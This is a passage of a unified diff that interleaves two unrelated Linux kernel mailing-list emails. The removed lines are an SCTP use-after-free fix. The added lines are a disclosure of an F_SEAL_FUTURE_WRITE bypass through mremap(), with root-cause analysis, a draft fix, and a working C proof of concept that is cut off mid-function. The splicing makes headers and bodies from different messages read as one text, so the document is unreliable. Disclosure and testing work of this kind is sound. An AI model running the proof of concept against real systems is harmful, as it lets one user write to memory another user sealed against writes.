@@ -1,90 +1,99 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.161.47
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.50
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794020736;
-	b=QNFdZW7A8i2UGh6ILeTuEj8lZisbsD453xpCd8pbu4c4T7ymAEvRInsyhTXNDepvyVut
-	 NbT16sQaAJoLapm0l7GpEnBLEqoaGCYGSY0kAkd/HzqRpR2n6Mj9hhxFTkuT6/yiHrl3+
-	 O2hZWkHFeel9un+aZzyMiAhSJrvYAIFEqFLUqFcESFPx2J6+mWFYQZchOUW9w7hswmq+o
-	 /yTwTZcTtAWuXsd6n8I5Uz2mUEJoV5MiFKwMMb9/9DUu0xDL/SddUeHGnrQxC6OPeALiw
-	 5C2JocQcYBztqafRcXOY+z1U+UGdOKGdlPufzHkn7f2j8aIHPr6Y2FBSKFaw50e7KQg==
+	t=1794020855;
+	b=pMDDJOd3x3C/pX7fb9feWCSoT3DfydCNJP65EMnSv5GRBqhp88wHVfjMN2/2bbcMzCI9
+	 BefHZpj2aTASyeh4GFA4xw3TYUsKXXjE5KUacLHsHDWZepQcVO48CaRBnQLI/ShUyqjpz
+	 9RvwonQgmbxgC/R78glH8L9K/tUwJwI1G4T/vA/Edrp+dUgmtnVm4SwcAU9LaWi7c22qb
+	 CeKJDjhmm4157PteejWiMwFc/H4SJ+FCAJAMmDR4G6WMZvnoOWlwaboqbfdb+r8nxtk2j
+	 3E7D8AbtkEqyM/lhDcNpHDB7oNCvIDKM3+gdZ05eB0Ld++xc9XRv5jIogIXSC3oTB+A==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794020736;
+	a=rsa-sha256; c=relaxed/relaxed; t=1794020855;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
 	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
 	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
 	 Content-Transfer-Encoding;
-	bh=rP1Yhc8V6RNptl8ZAiLhF4SuAftOJVbuJVVUglBaikU=;
-	b=xkSflGYT9feXKQ4kDNHSG7BYCp5Hxfarg8m4JW3A8Ckejq34kDqFk3FYkVfRgLmomCde
-	 KnZIQYkvWqBxPiOHJmhNYoptfC6cCb6x+8011Uz18wGwSjQJynsoP9w5hdF+4nvd0oE0y
-	 Voh082/HV/GdVotDpRDuD1QDvsgKHlZqQxpu545PSQg/d4T0odNiSpCCh0OhEkjcJXL2P
-	 lsyuLZiO9TbQUsPvueFxjVrCN1RukMslLWCN7ArUqjKi9vMPcZUCagYOD8IMbPLHKCozd
-	 j/BhnQ+7a8ODn/4BUMP9VwKQSetq3eAYU9w103GMYYQDV4gWG52rnN0FOCSe2yZeVLw==
+	bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
+	b=N3iPTST1n3ZyekwM5akP0pWPOui0DfZevfgtO7ayfTHRpcIJ04l6JAfmHefhNvYGyo7o
+	 CpntqdMiTTD2Bc6z2GngQyYZRlTnm1sGCKciYR8ebmRa81EaTHLEGMor/7xxIaxankJ03
+	 SQdnQ0UUhDwFv2bVqyQ/aQ6qxZS9K6B2IrFRe3BVShIwbOOqwt+38uegr70aQaBdOKEJl
+	 iRAbIv4waaPXvoibI0hlh/v/V6CDuzMwM+hCQpR03z189X8m0oC8lH9RYWc++1b2DYPT5
+	 ZnstUT67tdc9e9hc+auHJJK4j+pvO+uT78xBtncyqQhXgWy8dqh4ZwAQ4wzwu9Sg+dA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=openai.com;
-	spf=pass smtp.mailfrom=openai.com;
-	dkim=pass header.d=openai.com header.i=@openai.com header.a=rsa-sha256 header.s=google header.b=LnwVBnrF;
-	arc=none smtp.remote-ip=209.85.161.47
-Received: from mail-oo1-f47.google.com (mail-oo1-f47.google.com [209.85.161.47])
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=jLt++Shn;
+	arc=none smtp.remote-ip=74.125.82.50
+Received: from mail-dl1-f50.google.com (mail-dl1-f50.google.com [74.125.82.50])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 51EC3606A32E
-	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 03:05:36 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 51EC3606A32E
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=openai.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=openai.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3CFA4606A326
+	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 03:07:35 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3CFA4606A326
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=openai.com header.i=@openai.com header.a=rsa-sha256 header.s=google header.b=LnwVBnrF
-Received: by mail-oo1-f47.google.com with SMTP id 006d021491bc7-716ea2598eeso734811eaf.0
-        for <linux-kernel@vger.kernel.org>; Fri, 06 Nov 2026 19:05:36 -0800 (PST)
+	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=jLt++Shn
+Received: by mail-dl1-f50.google.com with SMTP id a92af1059eb24-1b2513decc3so700539c88.1
+        for <linux-kernel@vger.kernel.org>; Fri, 06 Nov 2026 19:07:35 -0800 (PST)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=openai.com; s=google; t=1794020735; x=1794625535; darn=vger.kernel.org;
+        d=gmail.com; s=20260707; t=1794020854; x=1794625654; darn=vger.kernel.org;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=rP1Yhc8V6RNptl8ZAiLhF4SuAftOJVbuJVVUglBaikU=;
-        b=LnwVBnrFVKd4RmmtwNpC5ZIpYUQ3jidty2bj9aG30X4RnNmPVWvtRXkubIjjaFev8e
-         PaUNsCLZIbiMUMitEH3IpDfAiaxnytnUnwoYmJnQzGiYfREvafWZ/dSQ2hFI7mcgairU
-         p8CuTzrpbPrrSbBINfVDKpwHDcX7tx4rBpBCI=
+        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
+        b=jLt++Shn1YvDTMlV8kAF2sBu8PYE3w5bgVfXDfaDNmmrzbKRDIU75Sk3YLD8wxPszt
+         wexTpEdtgGXTK/62Md6gn0WXMcnuHNGuHP2ezBi5ACFThgGPZ7MTY3tJWsGpiPsPfWxv
+         ViJbxHgqWKZHSgodzByndeRJ0maNGiMQngvvvWYn9z1BR1PdqKt8y2GOByHHdcDcMoKk
+         eLXfaVMH4hvrsx70yOsUyxPnItkqajZlTyUn4vjVu3D1Lv2sIB+BaoNrdX4QJJDw1Dgr
+         RSL4/QX0mTc7Y5i+Q/aFBYZrZ6CpImNPyL4190LaWNZuUqArOqSxQY47D0JtL5I6KrmE
+         QpNA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1794020735; x=1794625535;
+        d=1e100.net; s=20260707; t=1794020854; x=1794625654;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=rP1Yhc8V6RNptl8ZAiLhF4SuAftOJVbuJVVUglBaikU=;
-        b=d61vewDvj3A2scrXM7F1vUB1dW/WHDlqTje2fWDVz74XKfTXD5rm5X1P420JSPbOw4
-         S285WBdJZuda1tajkzFsOlRpJ8a2um4qRgfs8ZGaYJwoodC5nTzSOr+DTeNQJ8u+WtLG
-         PtQjjd8meVYqUfM+7VAQ70KUISVZ4gmj2dOLksufuiXrC1JJlSKY4WfbTLZf2IdMOM8X
-         b5+XHOI1Ybxd4IDYZM42nzAsVByD3io8x6c7NcNNNox+/ZL+dbqTtxc1ZT34vamh+YYe
-         DK4m6S5ZBhm0vLVoMWb1XiCTjcI95vqWo246TPVOtDplZKqzBhauju+1jAGArAoRR5pQ
-         i9Tw==
-X-Forwarded-Encrypted: i=1; AKwUvByN7IokxZKN6hgocBWcC6+LBkKARPxjYSA/Wbm/YH/8gCPp4FYsNFkP4RaO22PVYl+v47UqZubDBpEMKpE=@vger.kernel.org
-X-Gm-Message-State: APuU4Z95jgl8ASH+qHRFDGzOe8W1yWJ51wxTRWe/bkZzTGGmanMo8vEl
-	5FZb4j+RxFIPNeGh9qkxXn4JUU/fpj5dDXBcacA9mz6/iHeUfSHOA2LNh3WwKOSoPfI=
-X-Gm-Gg: AYBFou2F9Q/XVimIJqrXL4QWOMihXL4AtWSn90lab2y+j++o1pd75aKjOJ9mPA0O14n
-	cCme/C/qVsOZR5b1W8ipeZXzSD5Mpzx5iZrtKEzZnrmu7IVHErZhx3SMbr8I39JTIMq3HeVcaAa
-	uKxZ+5/z/vh+COefEaOVQhpxyYgBgo8pzZuKp1SX4gFYJTnXLuoObx0AsYCICjdHZVhVPHBpkR9
-	dx9o5SPMq1Wtr3og2nWk2QnJf09hwn3LEQ0uVdAJBe/g4liQtL3INyY7JXk8x+f5LhX4ttRXuGy
-	hjFj9SlEe736BWLmHORxTi7pBNhpSYJnETTv2RNwcsUO6nWCTw+mfQHdFA1H5s5nj5J8v07F5RG
-	6V3ZNJ0et+RrLTPn07nqqF8L8T4btf7zA97DB3O+j2J/Rui92N8T+0twD1+GsHG37UUA/jRjkrF
-	orHcKboqpAE0TRNuWRwFakbFybEVGb4Wr5KXdkyzSTVc6fUH7oN1n10ZG62eLql/DKcNoXrTC+o
-	aPxYACLl0w4viTmIyPba0bSUmpoLkvjaeo2l3jA6m/JDNcACvvs+InawI9DDB37OLi1371v51gj
-	gFcKW3d7pacGID8FHKYbFpNLVlCnkcp+pd8wM/zduch0eWN8NmEtpdnAcApXKJELvCv79FIsyL/
-	vxLEpeFtJfMDvqK+etTjdDkhiMT16bA==
-X-Received: by 2002:a05:6820:1621:b0:716:f44b:2dd6 with SMTP id 006d021491bc7-716f44b2f07mr1500290eaf.25.1794020735120;
-        Fri, 06 Nov 2026 19:05:35 -0800 (PST)
-Received: from com-75606.corp.openai.org ([199.47.143.1])
-        by smtp.gmail.com with ESMTPSA id 586e51a60fabf-4ad97a37725sm3581702fac.11.2026.11.06.19.05.34
-        (version=TLS1_3 cipher=TLS_CHACHA20_POLY1305_SHA256 bits=256/256);
-        Fri, 06 Nov 2026 19:05:34 -0800 (PST)
-From: Kyle Zeng <kylebot@openai.com>
-To: linux-sctp@vger.kernel.org
-Cc: lucien.xin@gmail.com,
-	marcelo.leitner@gmail.com,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH net v3] sctp: avoid requeueing pending control chunks
-Date: Fri,  6 Nov 2026 19:05:32 -0800
-Message-ID: <20261107030532.32310-1-kylebot@openai.com>
-X-Mailer: git-send-email 2.55.0
+        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
+        b=2xkpggNYFbswQkMnJto5gEDoZNDVU0beaufnI7FIFNyauGUOjPKoazdHJd+sEku8ng
+         QRRHHUGudbI8VHi2/DdXLwp7Zv3W/0gAezoyILpisD1U4EDQyQPD6aJppNEWzjbr6C9f
+         gDXDBzWcygqrxbP/k2Sb7NVqlOoa3n6YZvQsXJA5UGSIa8GSfTwGlc5pzoKBGx25uC6d
+         60EPmTFcRgEjJJvEJProf5T3SEhe4bZTfPuHIISOPbf1deuk5o1x9T8gXDgGpmDy4bP/
+         MrZBQ9E+OTR8o6USyiwcxQBWC8adm1oSk35I3oQOopHZ7RiwW2I5niDsBJnIVAUjYrKf
+         jGdA==
+X-Forwarded-Encrypted: i=1; AKwUvBwYG4Sn4J+soikdc4nBYrCWcSFnG4Bjq4C+9TafUAlKnajUEMmjwTX/oQqsM/9g7aIOQahp8FGtN1NQWMA=@vger.kernel.org
+X-Gm-Message-State: APuU4Z+DRbPi0T9wXQFk2p/WWICge8kNUSfS9QCurvvsyh9Xn72NYd7w
+	90bjh3UucffbtA0xY8YQKQKcqVBg3/mGcgqEpLpTIj8PeUTfplhB92Fl
+X-Gm-Gg: AYBFou0hOwQRPmxJaMGYQTXuq9kmY2Cu7lMCQ1J95RlqnTF88c+bSiU778rlV5DkXG9
+	nvHRxld3cczcb7QRLcGO9fJ7k3divLcaczeBVhW9+5yVoS/mJkoUWT9++Nd87nhdRavmkMKm9o+
+	dcygzLnn1OSWFVgoHg+SGFu3CJwyU2qEqmXr4g7QMA+nY2mhsdlTx98ql2YAWT6ggUFfGIR6P9i
+	Maaggl82Kj+Owt7cmmdnMpPju4H9bKVIVRsxyKrddVRBIH/wEJRo1p6L+8Bx6KlOtb/vgDJt6JY
+	oBnYqlYoa71rXMt+9jLfw7J+Lu8Nigzl6mkrkVj/wSbdsAw2TW8zSVkfyWL8NoXIBEGMqxjrx+r
+	vEjlFC6yAMZFdzOV6f9DN7KVTvCv4sfQRFs6dFMAciN/m+14ugnHX+AWu0bsPXUENx/yElPfP+E
+	3q8Scd9PgnuKC6GIhImtVqXbRSMwGLGZnmLKe8V889S5WFJXFehF0Zw3bWyxbgrfF6DV1p13zP6
+	NjJDuf3bksI23a5+QWlpLw0XHSfBcx/e/wCb6i/8JZc3B83r2SakQihc4gOzc3wADcoaWJfBBsw
+	cU8N+VB4oeU2mSdFBTwOGaY/dtN7TaZ/id6uMQNQKSoZV8eIMeI=
+X-Received: by 2002:a05:7022:ef07:b0:194:9e7a:3ba2 with SMTP id a92af1059eb24-1b25d29407bmr6193447c88.2.1794020854124;
+        Fri, 06 Nov 2026 19:07:34 -0800 (PST)
+Received: from localhost.localdomain ([112.170.44.210])
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1b25e4df114sm10141554c88.18.2026.11.06.19.07.31
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 06 Nov 2026 19:07:33 -0800 (PST)
+From: Junyoung Jang <graypanda.inzag@gmail.com>
+To: Andrew Morton <akpm@linux-foundation.org>,
+	"Liam R . Howlett" <liam@infradead.org>,
+	Lorenzo Stoakes <ljs@kernel.org>,
+	Hugh Dickins <hughd@google.com>,
+	David Hildenbrand <david@kernel.org>
+Cc: Vlastimil Babka <vbabka@kernel.org>,
+	Jann Horn <jannh@google.com>,
+	Pedro Falcato <pfalcato@suse.de>,
+	Baolin Wang <baolin.wang@linux.alibaba.com>,
+	linux-mm@kvack.org,
+	linux-kernel@vger.kernel.org,
+	Junyoung Jang <graypanda.inzag@gmail.com>
+Subject: mm/mremap: F_SEAL_FUTURE_WRITE can be bypassed via mremap() VMA expansion/duplication
+Date: Sat,  7 Nov 2026 12:07:08 +0900
+Message-ID: <20261107030708.1031977-1-graypanda.inzag@gmail.com>
+X-Mailer: git-send-email 2.43.0
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -96,80 +105,347 @@ Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-The T4 and RE-CONFIG timeout handlers take a reference to their cached
-control chunk and submit it through SCTP_CMD_REPLY. A previous
-transmission can still be on the control outqueue when output is corked
-or suppressed, or when sctp_packet_transmit_chunk() could not append the
-chunk.
+Hello,
 
-sctp_outq_tail() then adds the same list node a second time. Re-adding a
-non-tail entry can corrupt the list without being caught by the
-insertion-time list checks. A subsequent flush or association teardown
-can access an already freed chunk. The ASCONF path is reproducible by an
-unprivileged SCTP socket owner in a user/network namespace, with KASAN
-reporting a use-after-free in __sctp_outq_teardown().
+I found a reproducible F_SEAL_FUTURE_WRITE seal-policy bypass. A process
+holding a one-page shared writable memfd mapping created before the seal can
+use mremap() after the seal to gain writable access to additional file pages.
 
-Check sctp_chunk_pending() in both timeout handlers before taking the
-extra reference and issuing SCTP_CMD_REPLY. If the chunk is already
-linked, leave the existing entry for normal output processing. Keep
-the remaining timer and error-handling commands unchanged. This also
-covers RE-CONFIG retransmission after sctp_assoc_rm_peer() moves the
-request to another transport and starts its timer.
+In the accompanying two-UID reproducer, the second page belongs to a memfd
+created by a different unprivileged user. While a new writable mmap() and
+pwrite() to that second page both fail with -EPERM, the mremap() path
+succeeds and modifies the page's contents.
 
-The issue was found by an LLM.
+Affected tree tested:
 
-Fixes: 2e3216cd54b1 ("sctp: Follow security requirement of responding with 1 packet")
-Fixes: 7b9438de0cd4 ("sctp: add stream reconf timer")
-Cc: stable@kernel.org
-Suggested-by: Xin Long <lucien.xin@gmail.com>
-Signed-off-by: Kyle Zeng <kylebot@openai.com>
----
-v1: https://lore.kernel.org/netdev/20261030042321.74407-1-kylebot@openai.com/
-v2: Move the pending checks into the T4 and RE-CONFIG timeout handlers.
-v3: Drop OUTQ_FLUSH and use the two pending checks as suggested. Leave
-already-queued chunks for normal output processing.
+- Linux 7.4.0-rc1-gd48723711bae, built directly from upstream commit
+  d48723711bae9b8cdc56719c448ba42fef28cbee using x86_64_defconfig.
+- A second image built from the same commit with the proposed mm/mremap.c
+  diff, reported by uname as 7.4.0-rc1-gd48723711bae-dirty.
+- Each before/after pair was booted in QEMU with the same statically
+  linked C PoC.
 
-I have a reproducer for this issue and can share by DM.
+Root cause:
 
- net/sctp/sm_statefuns.c | 16 ++++++++++------
- 1 file changed, 10 insertions(+), 6 deletions(-)
+The missing seal check is in mm/mremap.c:check_prep_vma() (lines 1808-1872
+of the tested commit). mmap() calls memfd_check_seals_mmap() at
+mm/mmap.c:499; for F_SEAL_FUTURE_WRITE, mm/memfd.c:384-385 rejects a
+new shared writable mapping with EPERM. check_prep_vma() has no equivalent
+check before it permits a larger mapping.
 
-diff --git a/net/sctp/sm_statefuns.c b/net/sctp/sm_statefuns.c
-index b2f609f177fb..64519fd8f943 100644
---- a/net/sctp/sm_statefuns.c
-+++ b/net/sctp/sm_statefuns.c
-@@ -1122,9 +1122,11 @@ enum sctp_disposition sctp_sf_send_reconf(struct net *net,
- 		return SCTP_DISPOSITION_DELETE_TCB;
- 	}
+For the PoC's old_len=0 call, this condition at mm/mremap.c:1819 only
+rejects duplication of a non-shared VMA:
+
+    if (!old_len && !vma_test_any(vma, VMA_SHARED_BIT, VMA_MAYSHARE_BIT)) {
+
+It is false for the PoC's MAP_SHARED VMA. check_prep_vma() then checks
+VMA bounds and expansion limits and returns 0 at mm/mremap.c:1872 without
+checking vma->vm_file for write seals. For this zero-length call,
+expand_vma() moves the VMA and reaches copy_vma_and_data(), which calls
+copy_vma() with the larger new_len (mm/mremap.c:1293-1295):
+
+    new_vma = copy_vma(&vma, vrm->new_addr, vrm->new_len, new_pgoff,
+                       new_anon_pgoff, &pmc.need_rmap_locks,
+                       vrm->flags & MREMAP_DONTUNMAP);
+
+copy_vma() can duplicate the original VMA and extend its range
+(mm/vma.c:2052-2055), retaining VM_WRITE and VM_MAYWRITE. The newly
+covered second memfd page is writable despite F_SEAL_FUTURE_WRITE.
+Ordinary expansion with old_len=one page also succeeded on the unpatched
+kernel. A read-only shared mapping with VM_MAYWRITE can likewise be
+expanded and then changed to PROT_WRITE with mprotect().
+
+Impact:
+
+This allows a process to write to file pages outside its pre-seal mapping
+across a UID boundary, affecting scenarios where a memfd owner grants
+limited writable access to a specific range before sealing and relies on
+F_SEAL_FUTURE_WRITE to prevent future writable mappings of other pages.
+
+Reproducer summary:
+
+1. Start as root only to set up two distinct unprivileged UIDs (10002 for
+   the owner, 10001 for the writer); both drop all capabilities.
+2. UID 10002 creates a two-page memfd and initializes page two to 'A'.
+3. UID 10002 passes the fd to UID 10001 via SCM_RIGHTS.
+4. UID 10001 maps only page one with MAP_SHARED and PROT_WRITE.
+5. UID 10002 adds F_SEAL_FUTURE_WRITE.
+6. UID 10001 confirms a fresh writable mmap() of page two and pwrite() to it
+   both fail with -EPERM.
+7. UID 10001 calls mremap(old_addr, 0, 2 * page_size, MREMAP_MAYMOVE),
+   writes 'Z' through the expanded mapping, and UID 10002 reads 'Z' back
+   from the second file page.
+
+Build and run:
+  $ cc -O0 -g -Wall -Wextra -Werror -static memfd_future_write_mremap_poc.c -o poc
+  $ sudo ./poc
+  writer uid=10001; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=63
+  owner uid=10002; file page 2=Z; size=8192; result=255
+
+Suggested fix direction:
+
+I believe mremap() needs to check the memfd write seal before duplicating
+(old_len=0) or expanding (new_len > old_len) a shared VMA that has
+VM_MAYWRITE.
+
+I tested the rough diff below in check_prep_vma() on the same commit and
+confirmed that it blocks the reproducer (mremap fails with -EPERM). However,
+I am sending this as a bug report rather than a formal [PATCH] because I am
+unsure about potential side effects:
+
+1. Because a PROT_READ shared mapping with VM_MAYWRITE could be expanded and
+   later made writable via mprotect(), the diff temporarily sets VMA_WRITE_BIT
+   on a local flags copy to force memfd_check_seals_mmap() to return -EPERM.
+   However, this rejects legitimate read-only mremap() expansions outright,
+   whereas mmap() would normally allow a read-only mapping and simply clear
+   VM_MAYWRITE.
+2. I am not certain whether check_prep_vma() is the right place regarding
+   locking/synchronization against a concurrent F_ADD_SEALS call.
+
+I would appreciate your guidance on the proper way to handle this, or feel
+free to take it from here:
+
+diff --git a/mm/mremap.c b/mm/mremap.c
+index 70b7264aa..6ed390ed4 100644
+--- a/mm/mremap.c
++++ b/mm/mremap.c
+@@ -14,6 +14,7 @@
+ #include <linux/shm.h>
+ #include <linux/ksm.h>
+ #include <linux/mman.h>
++#include <linux/memfd.h>
+ #include <linux/swap.h>
+ #include <linux/capability.h>
+ #include <linux/fs.h>
+@@ -1807,6 +1808,17 @@ static int check_prep_vma(struct vma_remap_struct *vrm)
  
--	sctp_chunk_hold(asoc->strreset_chunk);
--	sctp_add_cmd_sf(commands, SCTP_CMD_REPLY,
--			SCTP_CHUNK(asoc->strreset_chunk));
-+	if (!sctp_chunk_pending(asoc->strreset_chunk)) {
-+		sctp_chunk_hold(asoc->strreset_chunk);
-+		sctp_add_cmd_sf(commands, SCTP_CMD_REPLY,
-+				SCTP_CHUNK(asoc->strreset_chunk));
+ 	old_len = vrm->old_len;
+ 	new_len = vrm->new_len;
++	if (new_len > old_len && vma->vm_file &&
++	    vma_test_all(vma, VMA_SHARED_BIT, VMA_MAYWRITE_BIT)) {
++		vma_flags_t flags = vma->flags;
++		int err;
++
++		/* A larger VMA could become writable via mprotect(). */
++		vma_flags_set(&flags, VMA_WRITE_BIT);
++		err = memfd_check_seals_mmap(vma->vm_file, &flags);
++		if (err)
++			return err;
 +	}
- 	sctp_add_cmd_sf(commands, SCTP_CMD_STRIKE, SCTP_TRANSPORT(transport));
  
- 	return SCTP_DISPOSITION_CONSUME;
-@@ -6197,9 +6199,11 @@ enum sctp_disposition sctp_sf_t4_timer_expire(
- 	 * chunk, it MUST be the same (including its serial number) as the last
- 	 * ASCONF sent.
- 	 */
--	sctp_chunk_hold(asoc->addip_last_asconf);
--	sctp_add_cmd_sf(commands, SCTP_CMD_REPLY,
--			SCTP_CHUNK(asoc->addip_last_asconf));
-+	if (!sctp_chunk_pending(asoc->addip_last_asconf)) {
-+		sctp_chunk_hold(asoc->addip_last_asconf);
-+		sctp_add_cmd_sf(commands, SCTP_CMD_REPLY,
-+				SCTP_CHUNK(asoc->addip_last_asconf));
-+	}
- 
- 	/* ADDIP 4.1 B5) Restart the T-4 RTO timer. Note that if a different
- 	 * destination is selected, then the RTO used will be that of the new
+ 	/*
+ 	 * !old_len is a special case where an attempt is made to 'duplicate'
 
-base-commit: 05441d697f7f9a927264f4058cbbc6a03dfcac9d
--- 
-2.55.0.openai.911.g06873a30d2f3
+Reproducer code (memfd_future_write_mremap_poc.c):
 
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Check whether a mapping created before F_SEAL_FUTURE_WRITE can be
+ * duplicated over a second page by a different UID after the seal.
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <grp.h>
+#include <linux/capability.h>
+#include <linux/memfd.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#define OWNER_UID 10002
+#define WRITER_UID 10001
+
+static int drop_to(uid_t uid)
+{
+	struct __user_cap_header_struct hdr = {
+		.version = _LINUX_CAPABILITY_VERSION_3, .pid = 0,
+	};
+	struct __user_cap_data_struct caps[2] = { { 0 }, { 0 } };
+
+	if (setgroups(0, NULL) || setresgid(uid, uid, uid) ||
+	    setresuid(uid, uid, uid))
+		return -1;
+	if (getuid() != uid || geteuid() != uid ||
+	    syscall(SYS_capget, &hdr, caps) ||
+	    caps[0].effective || caps[1].effective)
+		return -1;
+	return 0;
+}
+
+static int send_fd(int sock, int fd)
+{
+	char data = 'F';
+	char control[CMSG_SPACE(sizeof(fd))] = {};
+	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = control,
+		.msg_controllen = sizeof(control),
+	};
+	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+
+	cmsg->cmsg_level = SOL_SOCKET;
+	cmsg->cmsg_type = SCM_RIGHTS;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
+	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+	return sendmsg(sock, &msg, 0) == 1 ? 0 : -1;
+}
+
+static int recv_fd(int sock)
+{
+	char data;
+	char control[CMSG_SPACE(sizeof(int))] = {};
+	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = control,
+		.msg_controllen = sizeof(control),
+	};
+	struct cmsghdr *cmsg;
+	int fd;
+
+	if (recvmsg(sock, &msg, 0) != 1 || data != 'F')
+		return -1;
+	cmsg = CMSG_FIRSTHDR(&msg);
+	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET ||
+	    cmsg->cmsg_type != SCM_RIGHTS ||
+	    cmsg->cmsg_len != CMSG_LEN(sizeof(fd)))
+		return -1;
+	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
+	return fd;
+}
+
+static int writer(int sock, size_t page)
+{
+	char *old, *expanded;
+	char event;
+	int fd;
+	unsigned int result = 0;
+
+	if (drop_to(WRITER_UID) || getuid() != WRITER_UID)
+		return 1;
+	result |= 1;
+	fd = recv_fd(sock);
+	if (fd < 0)
+		return 2;
+	old = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (old == MAP_FAILED)
+		return 3;
+	result |= 2;
+	if (write(sock, "R", 1) != 1 || read(sock, &event, 1) != 1 ||
+	    event != 'S')
+		return 4;
+	result |= 4;
+	void *fresh = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED,
+			   fd, page);
+	if (fresh != MAP_FAILED) {
+		munmap(fresh, page);
+		fprintf(stderr, "writer: fresh writable mmap unexpectedly succeeded\n");
+		return 5;
+	}
+	if (errno != EPERM) {
+		fprintf(stderr, "writer: fresh writable mmap errno=%d\n", errno);
+		return 6;
+	}
+	result |= 8;
+	errno = 0;
+	ssize_t written = pwrite(fd, "X", 1, page);
+	if (written != -1 || errno != EPERM) {
+		fprintf(stderr, "writer: pwrite returned %zd errno=%d\n",
+			written, errno);
+		return 7;
+	}
+	result |= 16;
+	expanded = mremap(old, 0, 2 * page, MREMAP_MAYMOVE);
+	if (expanded == MAP_FAILED) {
+		fprintf(stderr, "writer: mremap errno=%d\n", errno);
+		return 8;
+	}
+	expanded[page] = 'Z';
+	result |= 32;
+	if (write(sock, "Z", 1) != 1)
+		return 9;
+	printf("writer uid=%u; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=%u\n",
+	       getuid(), result);
+	fflush(stdout);
+	munmap(expanded, 2 * page);
+	munmap(old, page);
+	close(fd);
+	return result == 63 ? 0 : 10;
+}
+
+int main(void)
+{
+	int pair[2], fd, status;
+	char event, byte = 0;
+	struct stat st;
+	pid_t pid;
+	size_t page = sysconf(_SC_PAGESIZE);
+	unsigned int result = 0;
+
+	alarm(10);
+	if (geteuid() != 0)
+		return 77;
+	if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, pair))
+		return 1;
+	pid = fork();
+	if (pid < 0)
+		return 2;
+	if (!pid) {
+		close(pair[0]);
+		_exit(writer(pair[1], page));
+	}
+	close(pair[1]);
+	if (drop_to(OWNER_UID) || getuid() != OWNER_UID)
+		return 3;
+	result |= 1;
+	fd = memfd_create("seal-cross-uid", MFD_ALLOW_SEALING);
